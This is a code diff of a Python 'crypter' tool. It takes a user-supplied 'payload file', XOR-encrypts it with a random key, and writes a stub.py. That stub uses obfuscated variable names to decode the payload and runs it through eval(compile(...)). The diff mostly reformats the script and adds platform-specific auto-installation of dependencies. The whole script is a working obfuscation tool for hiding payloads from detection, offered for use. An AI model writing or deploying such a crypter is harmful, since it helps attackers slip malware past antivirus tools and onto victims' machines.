@@ -1,27 +1,42 @@
 import random
 from pathlib import Path
-import  platform
+import platform
 import os
 import time
-print("[*] Checking Requirements Module.....")
-try:
-    import requests
-except ImportError:
-    print("[*]Installing request Module")
-    os.system("pip install requests -q -q -q")
-    import requests
-try:
-    import termcolor
-except ImportError:
-    print("[*]Installing termcolor Module")
-    os.system("pip install termcolor -q -q -q")
-    import termcolor
-try:
-    from PyFiglet import color
-except:
-    os.system("pip install pyfilget -q -q -q")
-    from PyFiglet import color
 
+print("[*] Checking Requirements Module.....")
+if platform.system().startswith("Linux"):
+    try:
+        import requests
+    except ImportError:
+        os.system("python3 -m pip install requests -q -q -q")
+        import requests
+    try:
+        import termcolor
+    except ImportError:
+        os.system("python3 -m pip install termcolor -q -q -q")
+        import termcolor
+    try:
+        from PyFiglet import color
+    except:
+        os.system("python3 -m pip install pyfilget -q -q -q")
+        from PyFiglet import color
+elif platform.system().startswith("Windows"):
+    try:
+        import requests
+    except ImportError:
+        os.system("python -m pip install requests -q -q -q")
+        import requests
+    try:
+        import termcolor
+    except ImportError:
+        os.system("python -m pip install termcolor -q -q -q")
+        import termcolor
+    try:
+        from PyFiglet import color
+    except:
+        os.system("python -m pip install pyfilget -q -q -q")
+        from PyFiglet import color
 def logo():
     print(termcolor.colored('''****************************************************************************
                 ________   __     ____    __   __   _____    ______        *
@@ -49,7 +64,7 @@ def catc():
             check()
     except KeyboardInterrupt:
         print()
-        print(termcolor.colored("\nYou Pressed The Exit Button!",'red'))
+        print(termcolor.colored("\nYou Pressed The Exit Button!", 'red'))
         quit()
 
 
@@ -57,38 +72,40 @@ def check():
     path_to_file = 'stub.py'
     path = Path(path_to_file)
     if path.is_file():
-        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))
+        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...', 'red'))
         print()
-        print(termcolor.colored("""[1] For Remove File: Type:- del\n[2] For Rename File: Type:- ren """,'yellow'))
+        print(termcolor.colored("""[1] For Remove File: Type:- del\n[2] For Rename File: Type:- ren """, 'yellow'))
         print()
-        a=input(termcolor.colored("[+]Do U Want To Remove Old File Or Rename File:- ",'blue'))
+        a = input(termcolor.colored("[+]Do U Want To Remove Old File Or Rename File:- ", 'blue'))
         print()
 
-        if(a=="del"):
+        if (a == "del"):
             os.remove('stub.py')
             time.sleep(2)
-            print(termcolor.colored("[*] File Successfully Deleted...",'green'))
+            print(termcolor.colored("[*] File Successfully Deleted...", 'green'))
             print()
             enc()
-        elif(a=="ren"):
-            os.rename('stub.py','old_stub.py')
+        elif (a == "ren"):
+            os.rename('stub.py', 'old_stub.py')
             time.sleep(2)
             print(termcolor.colored("[*] File Successfully Renamed...", 'green'))
             print()
             enc()
         else:
-            print(termcolor.colored("Plz! Remove or Rename It mannually",'red'))
+            print(termcolor.colored("Plz! Remove or Rename It mannually", 'red'))
     else:
         enc()
+
+
 def enc():
-    firstnum=input(termcolor.colored("[+] Enter Path Of Payload File:- ",'yellow'))
+    firstnum = input(termcolor.colored("[+] Enter Path Of Payload File:- ", 'yellow'))
     with open(firstnum) as f:
         contents = f.read()
     string = contents
     a = 0
     time.sleep(2)
     print()
-    print(termcolor.colored("[*] File Validation Success...",'green'))
+    print(termcolor.colored("[*] File Validation Success...", 'green'))
     xnd = ""
     while a < 100:
         xnd = xnd + str(random.randint(0, 9))
@@ -100,23 +117,26 @@ def enc():
         current_string = string[i]
         current_key = xnd[i % len(xnd)]
         output_string += chr(ord(current_string) ^ ord(current_key))
-    c=repr(output_string)
+    c = repr(output_string)
     time.sleep(2)
     print()
-    
-    print(termcolor.colored("[*] File Encryption Started...:-",'magenta'))
-    d=c.replace("'","")
+
+    print(termcolor.colored("[*] File Encryption Started...:-", 'magenta'))
+    d = c.replace("'", "")
     time.sleep(2)
     print()
-    print(termcolor.colored("[*] Generating Encryption Key...",'blue'))
+    print(termcolor.colored("[*] Generating Encryption Key...", 'blue'))
     try:
         with open('stub.py', 'w') as f:
             f.write(f"wopvEaTEcopFEavc =\"{d}\" \n")
             f.write(f"\niOpvEoeaaeavocp = \"{xnd}\"\n")
-            f.write("uocpEAtacovpe = len(wopvEaTEcopFEavc)\noIoeaTEAcvpae = \"\"\nfor fapcEaocva in range(uocpEAtacovpe):\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n\n\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))")
+            f.write(
+                "uocpEAtacovpe = len(wopvEaTEcopFEavc)\noIoeaTEAcvpae = \"\"\nfor fapcEaocva in range(uocpEAtacovpe):\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n\n\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))")
     except FileNotFoundError:
         print("")
     time.sleep(2)
     print()
-    print(termcolor.colored("[+] File Successfully Encrypted...",'green'))
+    print(termcolor.colored("[+] File Successfully Encrypted...", 'green'))
+
+
 catc()
